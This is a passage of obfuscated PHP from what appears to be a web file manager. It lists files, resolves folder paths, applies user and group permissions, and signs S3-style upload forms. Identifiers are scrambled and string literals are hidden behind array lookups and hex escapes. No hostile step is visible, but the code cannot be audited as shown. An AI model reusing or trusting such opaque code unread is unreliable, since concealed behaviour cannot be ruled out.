$ó¢ø°Áü = Model($®Å†¥[552])->listSimple(); $†ğÂØ‹¡ = array_to_keyvalue($Æ½áºö, $®Å†¥[477]); $âÓıõ†À = array_to_keyvalue_group($¸ÆÎ¼, $®Å†¥[87], $®Å†¥[502]); $«Œôœ©û = array_to_keyvalue($ıò‡ôªñ, $®Å†¥[87]); $ÍßÉ–ÎÊ = array_to_keyvalue_group($ó¢ø°Áü, $®Å†¥[193]); foreach ($±º  ò as &$áàìÓ™) { $áàìÓ™[$®Å†¥[90]] = array($®Å†¥[553] => 0, $®Å†¥[554] => 0, $®Å†¥[555] => 0); if (isset($«Œôœ©û[$áàìÓ™[$®Å†¥[193]]])) { $áàìÓ™[$®Å†¥[90]][$®Å†¥[556]] = 1; $áàìÓ™[$®Å†¥[90]][$®Å†¥[557]] = $«Œôœ©û[$áàìÓ™[$®Å†¥[193]]][$®Å†¥[32]]; } if ($âÓıõ†À && $†ğÂØ‹¡ && isset($âÓıõ†À[$áàìÓ™[$®Å†¥[193]]])) { $áàìÓ™[$®Å†¥[90]][$®Å†¥[558]] = array(); foreach ($âÓıõ†À[$áàìÓ™[$®Å†¥[193]]] as $çİí¨—’) { $¶•½§´ = $†ğÂØ‹¡[$çİí¨—’]; $áàìÓ™[$®Å†¥[90]][$®Å†¥[558]][] = array($®Å†¥[559] => $¶•½§´[$®Å†¥[477]], $®Å†¥[496] => $¶•½§´[$®Å†¥[32]], $®Å†¥[560] => $¶•½§´[$®Å†¥[561]]); } } if ($ÍßÉ–ÎÊ && isset($ÍßÉ–ÎÊ[$áàìÓ™[$®Å†¥[193]]])) { $áàìÓ™[$®Å†¥[90]][$®Å†¥[562]] = array(); foreach ($ÍßÉ–ÎÊ[$áàìÓ™[$®Å†¥[193]]] as $¬‡¤®¦) { $ñ¯áºı = $®Å†¥[563]; if ($¬‡¤®¦[$®Å†¥[564]] == $®Å†¥[91]) { $ñ¯áºı .= $®Å†¥[565]; } $áàìÓ™[$®Å†¥[90]][$®Å†¥[562]] = array_field_key($¬‡¤®¦, explode($®Å†¥[50], $ñ¯áºı)); } } } unset($áàìÓ™); return $±º  ò; } protected function _listAppendChildren(&$ÍÛïºÛ˜, $óŞ‹¥ı) { $ïÌèı”ç =& $_SERVER[ÔÕ±ĞšÎ]; $ğ§ãÓ«í = array(); $Æ”³»¸» = array($ïÌèı”ç[241] => 0, $ïÌèı”ç[242] => 0); foreach ($ÍÛïºÛ˜ as &$Ğ¬—øÊ§) { if (!$Ğ¬—øÊ§[$ïÌèı”ç[487]]) { continue; } $ğ§ãÓ«í[] = $Ğ¬—øÊ§[$ïÌèı”ç[193]]; } unset($Ğ¬—øÊ§); if (!$ğ§ãÓ«í) { return; } $Éˆ±ù­¾ = array($ïÌèı”ç[192] => array($ïÌèı”ç[7], $ğ§ãÓ«í), $ïÌèı”ç[507] => 0); $öäÉŠœ• = array($ïÌèı”ç[192], $ïÌèı”ç[487], $ïÌèı”ç[566] => $ïÌèı”ç[567]); $ø˜¢»œ = $this->field($öäÉŠœ•)->where($Éˆ±ù­¾)->group($ïÌèı”ç[568])->select(); $àêâØåÎ = array(); foreach ($ø˜¢»œ as $Ÿ·ü×ìŞ) { $§œ±†ÒŞ = $Ÿ·ü×ìŞ[$ïÌèı”ç[192]]; $¨—ÆØÒ‰ = $Ÿ·ü×ìŞ[$ïÌèı”ç[487]] == $ïÌèı”ç[91] ? $ïÌèı”ç[242] : $ïÌèı”ç[241]; if (!isset($àêâØåÎ[$§œ±†ÒŞ])) { $àêâØåÎ[$§œ±†ÒŞ] = array($ïÌèı”ç[241] => 0, $ïÌèı”ç[242] => 0); } $àêâØåÎ[$§œ±†ÒŞ][$¨—ÆØÒ‰] += $Ÿ·ü×ìŞ[$ïÌèı”ç[567]]; } foreach ($ÍÛïºÛ˜ as &$Ğ¬—øÊ§) { if (!$Ğ¬—øÊ§[$ïÌèı”ç[487]]) { continue; } $ËòÈˆ¹ = is_array($àêâØåÎ[$Ğ¬—øÊ§[$ïÌèı”ç[193]]]) ? $àêâØåÎ[$Ğ¬—øÊ§[$ïÌèı”ç[193]]] : $Æ”³»¸»; $Ğ¬—øÊ§[$ïÌèı”ç[242]] = $ËòÈˆ¹[$ïÌèı”ç[242]]; $Ğ¬—øÊ§[$ïÌèı”ç[241]] = $ËòÈˆ¹[$ïÌèı”ç[241]]; unset($Ğ¬—øÊ§[$ïÌèı”ç[488]]); } unset($Ğ¬—øÊ§); } protected function _listAppendAuth(&$·ˆ–’óı) { $¶Ì¨®ºû =& $_SERVER[ÔÕ±ĞšÎ]; $â âµò² = array(); foreach ($·ˆ–’óı as $æÒäÌÍ) { if ($æÒäÌÍ[$¶Ì¨®ºû[190]] == self::TYPE_GROUP) { $â âµò²[] = $æÒäÌÍ[$¶Ì¨®ºû[193]]; } } if (!$â âµò²) { return; } $Šü¯’©Ì = array_to_keyvalue($·ˆ–’óı, $¶Ì¨®ºû[193]); $ó•ÒıŠ¼ = Model($¶Ì¨®ºû[569])->getSourceList($â âµò², $Šü¯’©Ì); $¸ÄÑ‡”  = KodUser::isRoot(); foreach ($·ˆ–’óı as $“á ºƒà => &$æÒäÌÍ) { $æÒäÌÍ[$¶Ì¨®ºû[489]] = $ó•ÒıŠ¼[$æÒäÌÍ[$¶Ì¨®ºû[193]]]; if (!$æÒäÌÍ[$¶Ì¨®ºû[489]] && $æÒäÌÍ[$¶Ì¨®ºû[190]] == self::TYPE_GROUP) { $æÒäÌÍ[$¶Ì¨®ºû[489]] = Action($¶Ì¨®ºû[570])->pathGroupAuthMake($æÒäÌÍ[$¶Ì¨®ºû[571]]); if (!$æÒäÌÍ[$¶Ì¨®ºû[489]] && !$¸ÄÑ‡” ) { $æÒäÌÍ[$¶Ì¨®ºû[235]] = !1; $æÒäÌÍ[$¶Ì¨®ºû[234]] = !1; } } if ($æÒäÌÍ[$¶Ì¨®ºû[489]]) { $æÒäÌÍ[$¶Ì¨®ºû[235]] = AuthModel::authCheckEdit($æÒäÌÍ[$¶Ì¨®ºû[489]][$¶Ì¨®ºû[490]]); $æÒäÌÍ[$¶Ì¨®ºû[234]] = AuthModel::authCheckView($æÒäÌÍ[$¶Ì¨®ºû[489]][$¶Ì¨®ºû[490]]); } $this->groupPathDisplay($æÒäÌÍ); } unset($æÒäÌÍ); } public function _listAppendAuthSecret(&$ñšÄòÏí) { $—ù…Ê¿ =& $_SERVER[ÔÕ±ĞšÎ]; if (Model($—ù…Ê¿[510])->get($—ù…Ê¿[572]) != $—ù…Ê¿[91]) { return; } static $À¬ù¬Ë = false; if (!$À¬ù¬Ë) { $©Ö¬¼”„ = Model($—ù…Ê¿[573]); $¼ÛÉàÈ– = Model($—ù…Ê¿[574]); $À¬ù¬Ë = $¼ÛÉàÈ–->listData(); $À¬ù¬Ë = array_to_keyvalue($À¬ù¬Ë, $—ù…Ê¿[193]); $•ßıå = json_decode(Model($—ù…Ê¿[510])->get($—ù…Ê¿[575]), !0); $•ßıå = array_to_keyvalue($•ßıå, $—ù…Ê¿[477]); foreach ($À¬ù¬Ë as $Üè‰º· => $–üÈ¸€†) { $¾ÔÇÓèß = $•ßıå[$–üÈ¸€†[$—ù…Ê¿[576]]]; if (!$¾ÔÇÓèß) { $¼ÛÉàÈ–->remove($–üÈ¸€†[$—ù…Ê¿[477]]); unset($À¬ù¬Ë[$Üè‰º·]); continue; } $°•ˆéÊ = $©Ö¬¼”„->listData($¾ÔÇÓèß[$—ù…Ê¿[489]]); if (!$°•ˆéÊ) { $¼ÛÉàÈ–->remove($–üÈ¸€†[$—ù…Ê¿[477]]); unset($À¬ù¬Ë[$Üè‰º·]); continue; } $–üÈ¸€†[$—ù…Ê¿[489]] = $°•ˆéÊ; $–üÈ¸€†[$—ù…Ê¿[577]] = $¾ÔÇÓèß; $–üÈ¸€†[$—ù…Ê¿[578]] = Model($—ù…Ê¿[579])->getInfoSimpleOuter($–üÈ¸€†[$—ù…Ê¿[529]]); $À¬ù¬Ë[$Üè‰º·] = $–üÈ¸€†; } } $ºúŒ‰êÙ = USER_ID; $ƒƒÁ…“Ê = array(); $È£³Ãñ = $this->_listAppendPath($ƒƒÁ…“Ê, !0); foreach ($ñšÄòÏí as $Üè‰º· => &$–üÈ¸€†) { if (!is_array($–üÈ¸€†[$—ù…Ê¿[489]])) { continue; } if ($–üÈ¸€†[$—ù…Ê¿[190]] != $—ù…Ê¿[580]) { continue; } if (isset($À¬ù¬Ë[$–üÈ¸€†[$—ù…Ê¿[193]]])) { $¨Û•ƒ£ = $À¬ù¬Ë[$–üÈ¸€†[$—ù…Ê¿[193]]]; if (!is_array($–üÈ¸€†[$—ù…Ê¿[541]])) { $–üÈ¸€†[$—ù…Ê¿[541]] = array(); } $–üÈ¸€†[$—ù…Ê¿[541]][$—ù…Ê¿[581]] = $¨Û•ƒ£[$—ù…Ê¿[576]]; $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[582]] = $¨Û•ƒ£; $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[583]] = $–üÈ¸€†[$—ù…Ê¿[584]]; $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[585]] = $—ù…Ê¿[91]; if ($¨Û•ƒ£[$—ù…Ê¿[529]] != $ºúŒ‰êÙ) { $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[490]] = $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[490]] & $¨Û•ƒ£[$—ù…Ê¿[489]][$—ù…Ê¿[489]]; } continue; } $ñ¢ïŒ¡ = $this->parentLevelArray($–üÈ¸€†[$—ù…Ê¿[586]]); $ÂÎ§ÖÆı = array_reverse($ñ¢ïŒ¡); foreach ($ÂÎ§ÖÆı as $Ê¿Ìİ¡“ => $¸á­µÛâ) { if (!isset($À¬ù¬Ë[$¸á­µÛâ])) { continue; } $¨Û•ƒ£ = $À¬ù¬Ë[$¸á­µÛâ]; $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[582]] = $¨Û•ƒ£; if ($¨Û•ƒ£[$—ù…Ê¿[529]] != $ºúŒ‰êÙ) { $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[490]] = $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[490]] & $¨Û•ƒ£[$—ù…Ê¿[489]][$—ù…Ê¿[489]]; } $ĞÍÌÜñ‰ = $—ù…Ê¿[12]; $ß•Œãó = count($ñ¢ïŒ¡) - $Ê¿Ìİ¡“; for ($Î…—Âß¨ = 0; $Î…—Âß¨ < $ß•Œãó; $Î…—Âß¨++) { if (!isset($È£³Ãñ[$ñ¢ïŒ¡[$Î…—Âß¨]])) { $ĞÍÌÜñ‰ = $—ù…Ê¿[12]; break; } $ĞÍÌÜñ‰ = $ĞÍÌÜñ‰ . rtrim($È£³Ãñ[$ñ¢ïŒ¡[$Î…—Âß¨]], $—ù…Ê¿[8]) . $—ù…Ê¿[8]; } $–üÈ¸€†[$—ù…Ê¿[489]][$—ù…Ê¿[583]] = rtrim($ĞÍÌÜñ‰, $—ù…Ê¿[8]) . $—ù…Ê¿[8]; break; } } unset($–üÈ¸€†); } public function groupPathDisplay(&$åğ¢æÚ) { $˜ºÇ÷ô  =& $_SERVER[ÔÕ±ĞšÎ]; if ($åğ¢æÚ[$˜ºÇ÷ô [190]] != self::TYPE_GROUP) { return; } $ÂÁäİÕ = Model($˜ºÇ÷ô [587])->getInfo($åğ¢æÚ[$˜ºÇ÷ô [571]]); $€ÄÖÑƒ´ = $this->parentLevelArray($ÂÁäİÕ[$˜ºÇ÷ô [586]]); $ìñ³ÔŠÖ = $˜ºÇ÷ô [12]; foreach ($€ÄÖÑƒ´ as $¢…ÀóÂŸ) { $Ô¤¦¸½ = Model($˜ºÇ÷ô [587])->getInfo($¢…ÀóÂŸ); $ìñ³ÔŠÖ .= $Ô¤¦¸½[$˜ºÇ÷ô [90]][$˜ºÇ÷ô [193]] . $˜ºÇ÷ô [50]; } $åğ¢æÚ[$˜ºÇ÷ô [588]] = $ÂÁäİÕ[$˜ºÇ÷ô [192]]; $åğ¢æÚ[$˜ºÇ÷ô [589]] = $ÂÁäİÕ[$˜ºÇ÷ô [586]]; $åğ¢æÚ[$˜ºÇ÷ô [590]] = $ÂÁäİÕ[$˜ºÇ÷ô [591]]; $åğ¢æÚ[$˜ºÇ÷ô [592]] = $ìñ³ÔŠÖ . $ÂÁäİÕ[$˜ºÇ÷ô [90]][$˜ºÇ÷ô [193]]; } protected function _listAppendPath(&$ğ×È ©, $å“ÅÒÌÒ = false) { $½¶¡®À¶ =& $_SERVER[ÔÕ±ĞšÎ]; static $–‹’É– = array(); $áÈÓŒîû = array(); $ŒïàÒå€ = array(); if ($å“ÅÒÌÒ) { return $–‹’É–; } foreach ($ğ×È © as &$¼À¬•´¡) { $…§úÊ‘ = $¼À¬•´¡[$½¶¡®À¶[193]]; if ($¼À¬•´¡[$½¶¡®À¶[487]] == $½¶¡®À¶[91] && $¼À¬•´¡[$½¶¡®À¶[192]] != 0) { $–‹’É–[$…§úÊ‘] = $¼À¬•´¡[$½¶¡®À¶[32]]; } if ($¼À¬•´¡[$½¶¡®À¶[487]] == $½¶¡®À¶[91] && $¼À¬•´¡[$½¶¡®À¶[192]] == 0) { $–‹’É–[$…§úÊ‘] = $this->_listAppendPathRoot($¼À¬•´¡, array()); } if (isset($ŒïàÒå€[$¼À¬•´¡[$½¶¡®À¶[586]]])) { continue; } $ŒïàÒå€[$¼À¬•´¡[$½¶¡®À¶[586]]] = !0; $Å¬³ß»Ò = $this->parentLevelArray($¼À¬•´¡[$½¶¡®À¶[586]]); foreach ($Å¬³ß»Ò as $‹æ÷±€ => $ßñš÷–) { if (isset($–‹’É–[$ßñš÷–])) { continue; } if ($‹æ÷±€ == 0) { $–‹’É–[$ßñš÷–] = $this->_listAppendPathRoot($¼À¬•´¡, $Å¬³ß»Ò); } if ($‹æ÷±€ != 0) { $áÈÓŒîû[] = $ßñš÷–; } } } unset($¼À¬•´¡); $áÈÓŒîû = array_unique($áÈÓŒîû); if (count($áÈÓŒîû) > 0) { $ Ò°ª² = array($½¶¡®À¶[493] => array($½¶¡®À¶[494], $áÈÓŒîû)); if (count($áÈÓŒîû) == 1) { $ÃÕÓİˆÌ = $this->sourceInfo($áÈÓŒîû[0]); $ò—ş¶À£ = is_array($ÃÕÓİˆÌ) ? array($ÃÕÓİˆÌ) : !1; } else { $ò—ş¶À£ = $this->field($½¶¡®À¶[593])->where($ Ò°ª²)->select(); } if (!$ò—ş¶À£) { $ò—ş¶À£ = array(); } foreach ($ò—ş¶À£ as $á×­šõú) { $–‹’É–[$á×­šõú[$½¶¡®À¶[193]]] = $á×­šõú[$½¶¡®À¶[32]]; } } $àã˜úç‡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $æğ‰éÂà = array(); foreach ($ğ×È © as &$¼À¬•´¡) { $§İïÓÎ = $¼À¬•´¡[$½¶¡®À¶[586]]; $©¸éà = $½¶¡®À¶[12]; if (isset($æğ‰éÂà[$§İïÓÎ])) { $©¸éà = $æğ‰éÂà[$§İïÓÎ]; } else { $Å¬³ß»Ò = $this->parentLevelArray($¼À¬•´¡[$½¶¡®À¶[586]]); foreach ($Å¬³ß»Ò as $‹æ÷±€ => $ßñš÷–) { if (isset($–‹’É–[$ßñš÷–])) { $©¸éà .= $–‹’É–[$ßñš÷–] . $½¶¡®À¶[8]; } } $æğ‰éÂà[$§İïÓÎ] = $©¸éà; } $©¸éà .= $¼À¬•´¡[$½¶¡®À¶[32]]; if ($¼À¬•´¡[$½¶¡®À¶[487]] == $½¶¡®À¶[91]) { $©¸éà .= $½¶¡®À¶[8]; } $¼À¬•´¡[$½¶¡®À¶[584]] = str_replace($½¶¡®À¶[256], $½¶¡®À¶[8], $©¸éà); if ($¼À¬•´¡[$½¶¡®À¶[192]] == $½¶¡®À¶[230]) { $¼À¬•´¡[$½¶¡®À¶[32]] = trim($–‹’É–[$¼À¬•´¡[$½¶¡®À¶[193]]], $½¶¡®À¶[8]); $¼À¬•´¡[$½¶¡®À¶[584]] = $¼À¬•´¡[$½¶¡®À¶[32]] . $½¶¡®À¶[8]; } if (intval($¼À¬•´¡[$½¶¡®À¶[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¼À¬•´¡, $Å¬³ß»Ò, $àã˜úç‡); } } unset($¼À¬•´¡); return $ğ×È ©; } private function _listAppendPathRecycle(&$Ş£‚ïŸŞ, $Úº¦Òç, $¢•’ü³²) { $ĞÎÇú =& $_SERVER[ÔÕ±ĞšÎ]; if (!in_array($¢•’ü³², $Úº¦Òç) && $Ş£‚ïŸŞ[$ĞÎÇú[193]] != $¢•’ü³²) { return; } $ğÑâÅş² = explode($ĞÎÇú[8], trim($Ş£‚ïŸŞ[$ĞÎÇú[584]], $ĞÎÇú[8])); $ñ˜×š° = implode($ĞÎÇú[8], array_slice($ğÑâÅş², 2)); $Ş£‚ïŸŞ[$ĞÎÇú[584]] = $ĞÎÇú[8] . LNG($ĞÎÇú[594]) . $ĞÎÇú[8] . ltrim($ñ˜×š°, $ĞÎÇú[8]); $Ş£‚ïŸŞ[$ĞÎÇú[586]] = $ĞÎÇú[595] . implode($ĞÎÇú[50], array_slice($Úº¦Òç, 1)) . $ĞÎÇú[50]; if ($Ş£‚ïŸŞ[$ĞÎÇú[193]] == $¢•’ü³²) { $Ş£‚ïŸŞ[$ĞÎÇú[586]] = $ĞÎÇú[595]; $Ş£‚ïŸŞ[$ĞÎÇú[192]] = $ĞÎÇú[230]; $Ş£‚ïŸŞ[$ĞÎÇú[32]] = LNG($ĞÎÇú[594]); } $Ş£‚ïŸŞ[$ĞÎÇú[596]] = $ĞÎÇú[597]; } protected function _listAppendPathRoot(&$½Ôüñ‘Š, $•ñÄÒ“) { $øàèˆş =& $_SERVER[ÔÕ±ĞšÎ]; static $½Ûª®¾ = false; static $çæŞşÌ¡ = false; $ Ê•¡È = $øàèˆş[12]; if ($½Ôüñ‘Š[$øàèˆş[190]] == self::TYPE_USER) { if ($½Ôüñ‘Š[$øàèˆş[571]] == USER_ID) { $ Ê•¡È = LNG($øàèˆş[598]); if ($½Ûª®¾ === !1) { $Ë‚ş¥ = Model($øàèˆş[599])->getInfoFull(USER_ID); $½Ûª®¾ = _get($Ë‚ş¥, $øàèˆş[600], $øàèˆş[12]); } if ($çæŞşÌ¡ === !1) { $Ë‚ş¥ = Model($øàèˆş[599])->getInfoFull(USER_ID); $çæŞşÌ¡ = _get($Ë‚ş¥, $øàèˆş[601], $øàèˆş[12]); } if ($•ñÄÒ“ && $•ñÄÒ“[0] == $½Ûª®¾ || !$•ñÄÒ“ && $½Ôüñ‘Š[$øàèˆş[193]] == $½Ûª®¾) { $ Ê•¡È = LNG($øàèˆş[602]); $½Ôüñ‘Š[$øàèˆş[603]] = $øàèˆş[604]; } if ($•ñÄÒ“ && $•ñÄÒ“[0] == $çæŞşÌ¡ || !$•ñÄÒ“ && $½Ôüñ‘Š[$øàèˆş[193]] == $çæŞşÌ¡) { $ Ê•¡È = $ Ê•¡È . $øàèˆş[605] . LNG($øàèˆş[606]); } if (!$•ñÄÒ“) { $½Ôüñ‘Š[$øàèˆş[32]] = $ Ê•¡È; } } else { $Ë‚ş¥ = Model($øàèˆş[599])->getInfoFull($½Ôüñ‘Š[$øàèˆş[571]]); $ÜÕÈ·Èİ = _get($Ë‚ş¥, $øàèˆş[601], $øàèˆş[12]); $½Ôüñ‘Š[$øàèˆş[607]] = Model($øàèˆş[579])->getInfoSimpleOuter($½Ôüñ‘Š[$øàèˆş[571]]); $ Ê•¡È = LNG($øàèˆş[608]) . $øàèˆş[176] . $½Ôüñ‘Š[$øàèˆş[607]][$øàèˆş[32]] . $øàèˆş[178]; if ($•ñÄÒ“ && $•ñÄÒ“[0] == $ÜÕÈ·Èİ || !$•ñÄÒ“ && $½Ôüñ‘Š[$øàèˆş[193]] == $ÜÕÈ·Èİ) { $ Ê•¡È = LNG($øàèˆş[608]) . $øàèˆş[609] . $½Ôüñ‘Š[$øàèˆş[607]][$øàèˆş[32]] . $øàèˆş[605] . LNG($øàèˆş[606]) . $øàèˆş[178]; } } } else { if ($½Ôüñ‘Š[$øàèˆş[190]] == self::TYPE_GROUP) { $ù«àÓæ„ = Model($øàèˆş[587])->getInfoSimple($½Ôüñ‘Š[$øàèˆş[571]]); $ Ê•¡È = $ù«àÓæ„[$øàèˆş[32]]; } else { if ($½Ôüñ‘Š[$øàèˆş[190]] == self::TYPE_SYSTEM) { $ Ê•¡È = $øàèˆş[610]; } } } $ Ê•¡È = $ Ê•¡È ? $øàèˆş[8] . $ Ê•¡È . $øàèˆş[8] : $øàèˆş[8]; return $ Ê•¡È; } protected function _listAppendUser(&$Ø“¤÷ß) { $ÉÍ‚Óœ =& $_SERVER[ÔÕ±ĞšÎ]; $ÙÔÇ‹½é = array_to_keyvalue($Ø“¤÷ß, $ÉÍ‚Óœ[12], $ÉÍ‚Óœ[529]); $İ§ç“¬µ = array_to_keyvalue($Ø“¤÷ß, $ÉÍ‚Óœ[12], $ÉÍ‚Óœ[531]); $şßÌ’ ğ = array_merge($ÙÔÇ‹½é, $İ§ç“¬µ); $›ÙÃêÒ = Model($ÉÍ‚Óœ[599])->userListInfo($şßÌ’ ğ); foreach ($Ø“¤÷ß as &$§­Şˆá·) { $ó¼´Šå = $§­Şˆá·[$ÉÍ‚Óœ[529]]; $§­Şˆá·[$ÉÍ‚Óœ[529]] = $›ÙÃêÒ[$ó¼´Šå] ? $›ÙÃêÒ[$ó¼´Šå] : !1; $ó¼´Šå = $§­Şˆá·[$ÉÍ‚Óœ[531]]; $§­Şˆá·[$ÉÍ‚Óœ[531]] = $›ÙÃêÒ[$ó¼´Šå] ? $›ÙÃêÒ[$ó¼´Šå] : !1; if (_get($§­Şˆá·, $ÉÍ‚Óœ[611], 0)) { $Ãê„…ø£ = $GLOBALS[$ÉÍ‚Óœ[6]][$ÉÍ‚Óœ[92]][$ÉÍ‚Óœ[612]]; if ($§­Şˆá·[$ÉÍ‚Óœ[541]][$ÉÍ‚Óœ[613]] <= time() - $Ãê„…ø£) { $this->metaSet($§­Şˆá·[$ÉÍ‚Óœ[193]], $ÉÍ‚Óœ[614], null); $this->metaSet($§­Şˆá·[$ÉÍ‚Óœ[193]], $ÉÍ‚Óœ[613], null); unset($§­Şˆá·[$ÉÍ‚Óœ[541]][$ÉÍ‚Óœ[614]]); continue; } $å²Ã±ÍÉ = $§­Şˆá·[$ÉÍ‚Óœ[541]][$ÉÍ‚Óœ[614]]; $§­Şˆá·[$ÉÍ‚Óœ[541]][$ÉÍ‚Óœ[615]] = Model($ÉÍ‚Óœ[599])->getInfoSimpleOuter($å²Ã±ÍÉ); } } unset($§­Şˆá·); } public function parentLevelArray($øØ¹’Ïä) { $ßšÁ†é½ =& $_SERVER[ÔÕ±ĞšÎ]; $øØ¹’Ïä = explode($ßšÁ†é½[50], trim($øØ¹’Ïä, $ßšÁ†é½[50])); return array_remove_value($øØ¹’Ïä, $ßšÁ†é½[230]); } public function listAll($—ûôçŞ¹) { $ÙÒ‹Ÿİ =& $_SERVER[ÔÕ±ĞšÎ]; $®Êëİ‘« = $this->sourceInfo($—ûôçŞ¹); $ì¦Ò‹æÑ = array($ÙÒ‹Ÿİ[616] => array($ÙÒ‹Ÿİ[617], $®Êëİ‘«[$ÙÒ‹Ÿİ[586]] . $—ûôçŞ¹ . $ÙÒ‹Ÿİ[618]), $ÙÒ‹Ÿİ[619] => 0); $“‡µ„š† = $ÙÒ‹Ÿİ[620]; $ÂÏ–ÎÑ¹ = "\x4c\x45\106\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\145\40\146\x69\154\x65\x20\x6f\156\40\163\157\165\x72\143\x65\x2e\x66\151\x6c\145\111\104\x20\75\40\146\x69\x6c\145\56\146\x69\x6c\x65\x49\104"; $Î½Êå“ş = $this->alias($ÙÒ‹Ÿİ[521])->field($“‡µ„š†)->where($ì¦Ò‹æÑ)->join($ÂÏ–ÎÑ¹)->select(); $this->_listAppendAuth($Î½Êå“ş); $this->_listAppendUser($Î½Êå“ş); $this->_listAppendPath($Î½Êå“ş); $Î½Êå“ş = array_to_keyvalue($Î½Êå“ş, $ÙÒ‹Ÿİ[193]); $×­€Æ´‘ = "\57{$®Êëİ‘«[$ÙÒ‹Ÿİ[32]]}\57"; $×­€Æ´‘ = $×­€Æ´‘ == $ÙÒ‹Ÿİ[256] ? $ÙÒ‹Ÿİ[8] : $×­€Æ´‘; $˜¬¢Ô‡Ğ = array(); foreach ($Î½Êå“ş as $Ö¹­Œè¨ => $“ÂêÎ¿) { $¬²îŞ = $this->parentLevelArray($“ÂêÎ¿[$ÙÒ‹Ÿİ[586]]); array_shift($¬²îŞ); $††„ÓÄ¼ = $×­€Æ´‘; for ($ê†Ùñ‚ò = 0; $ê†Ùñ‚ò < count($¬²îŞ); $ê†Ùñ‚ò++) { $††„ÓÄ¼ .= $Î½Êå“ş[$¬²îŞ[$ê†Ùñ‚ò]][$ÙÒ‹Ÿİ[32]] . $ÙÒ‹Ÿİ[8]; } $††„ÓÄ¼ .= $“ÂêÎ¿[$ÙÒ‹Ÿİ[32]]; if ($“ÂêÎ¿[$ÙÒ‹Ÿİ[487]]) { $††„ÓÄ¼ .= $ÙÒ‹Ÿİ[8]; } $ŞŞè¯€Ú = array($ÙÒ‹Ÿİ[497] => str_replace($ÙÒ‹Ÿİ[256], $ÙÒ‹Ÿİ[8], str_replace($ÙÒ‹Ÿİ[256], $ÙÒ‹Ÿİ[8], str_replace($ÙÒ‹Ÿİ[256], $ÙÒ‹Ÿİ[8], $††„ÓÄ¼))), $ÙÒ‹Ÿİ[621] => intval($“ÂêÎ¿[$ÙÒ‹Ÿİ[487]]), $ÙÒ‹Ÿİ[622] => intval($“ÂêÎ¿[$ÙÒ‹Ÿİ[79]]), $ÙÒ‹Ÿİ[88] => intval($“ÂêÎ¿[$ÙÒ‹Ÿİ[88]]), $ÙÒ‹Ÿİ[90] => $this->pathInfoFilter($“ÂêÎ¿)); if (!$ŞŞè¯€Ú[$ÙÒ‹Ÿİ[487]]) { $ŞŞè¯€Ú[$ÙÒ‹Ÿİ[543]] = $“ÂêÎ¿[$ÙÒ‹Ÿİ[543]]; } $˜¬¢Ô‡Ğ[] = $ŞŞè¯€Ú; } $˜¬¢Ô‡Ğ = array_sort_by($˜¬¢Ô‡Ğ, $ÙÒ‹Ÿİ[87]); return $˜¬¢Ô‡Ğ; } } goto b‘åŠÙ­İí; cíì®™åªˆ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ğÈÒ©¼ß) { parent::__construct($ğÈÒ©¼ß); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } public function uploadFormData($ Á°ÉÉ, $³ñ·Ööõ = 3600) { $şÖÑ÷Ãå =& $_SERVER[ÔÕ±ĞšÎ]; $ãü¸¡î’ = $şÖÑ÷Ãå[231]; $æ˜’±õâ = $şÖÑ÷Ãå[259]; $¾Êñõ = $şÖÑ÷Ãå[62]; $ü”©›…Ó = gmdate($şÖÑ÷Ãå[260]); $Ò®¸±Ëñ = gmdate($şÖÑ÷Ãå[261]); $áÎ Ø’Ÿ = $şÖÑ÷Ãå[262]; $ê“ßæö› = $³ñ·Ööõ . $şÖÑ÷Ãå[12]; $ãÃ‡à¡¼ = $şÖÑ÷Ãå[263]; $âÛˆ¬‹ = array($this->accessKey, $Ò®¸±Ëñ, $this->region, $¾Êñõ, $áÎ Ø’Ÿ); $³ØùÍóŠ = implode($şÖÑ÷Ãå[8], $âÛˆ¬‹); $œ¥Ë‘ßœ = array($şÖÑ÷Ãå[264] => gmdate($şÖÑ÷Ãå[1415], strtotime($şÖÑ÷Ãå[266])), $şÖÑ÷Ãå[267] => array(array($şÖÑ÷Ãå[268] => $this->bucket), array($şÖÑ÷Ãå[308] => $ãü¸¡î’), array($şÖÑ÷Ãå[269], $şÖÑ÷Ãå[270], $şÖÑ÷Ãå[12]), array($şÖÑ÷Ãå[269], $şÖÑ÷Ãå[271], $şÖÑ÷Ãå[12]), array($şÖÑ÷Ãå[269], $şÖÑ÷Ãå[309], $şÖÑ÷Ãå[12]), array($şÖÑ÷Ãå[272] => $ãÃ‡à¡¼), array($şÖÑ÷Ãå[273] => $³ØùÍóŠ), array($şÖÑ÷Ãå[274] => $æ˜’±õâ), array($şÖÑ÷Ãå[275] => $ü”©›…Ó), array($şÖÑ÷Ãå[276] => $ê“ßæö›))); $¨“¬ğ = base64_encode(json_encode($œ¥Ë‘ßœ)); $”·âøÒ = hash_hmac($şÖÑ÷Ãå[277], $Ò®¸±Ëñ, $şÖÑ÷Ãå[278] . $this->secret, !0); $‰‹ùø‡ˆ = hash_hmac($şÖÑ÷Ãå[277], $this->region, $”·âøÒ, !0); $»Ñ°“û­ = hash_hmac($şÖÑ÷Ãå[277], $¾Êñõ, $‰‹ùø‡ˆ, !0); $ºˆùæıÑ = hash_hmac($şÖÑ÷Ãå[277], $áÎ Ø’Ÿ, $»Ñ°“û­, !0); $ÙÂÎ‚õ = hash_hmac($şÖÑ÷Ãå[277], $¨“¬ğ, $ºˆùæıÑ); $ş®è•å¥ = array($şÖÑ÷Ãå[248] => $şÖÑ÷Ãå[12], $şÖÑ÷Ãå[296] => $şÖÑ÷Ãå[12], $şÖÑ÷Ãå[308] => $ãü¸¡î’, $şÖÑ÷Ãå[272] => $ãÃ‡à¡¼, $şÖÑ÷Ãå[279] => $¨“¬ğ, $şÖÑ÷Ãå[310] => $³ØùÍóŠ, $şÖÑ÷Ãå[311] => $æ˜’±õâ, 